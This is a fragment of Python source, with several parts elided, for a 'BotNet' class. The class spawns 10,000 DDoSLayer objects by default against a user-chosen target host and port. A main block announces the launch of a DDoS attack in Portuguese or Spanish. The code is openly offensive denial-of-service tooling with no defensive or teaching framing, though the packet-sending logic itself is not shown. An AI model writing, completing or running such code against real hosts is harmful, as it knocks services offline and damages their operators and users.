...
class BotNet:
    def __init__(self, target_host, target_port, attack_type="tcp", 
                 num_bots=10000, max_workers=None):
        self.target_host = target_host
        self.target_port = target_port
        self.attack_type = attack_type
    ...
    def create_bots(self):
        ...
        for _ in range(self.num_bots):
            layer = DDoSLayer(self.target_host, self.target_port, self.attack_type)
            layers.append(layer)
        return layers
...
if __name__ == "__main__":
    ...
    print(f"Iniciando ataque DDoS para {target_host}:{target_port}")
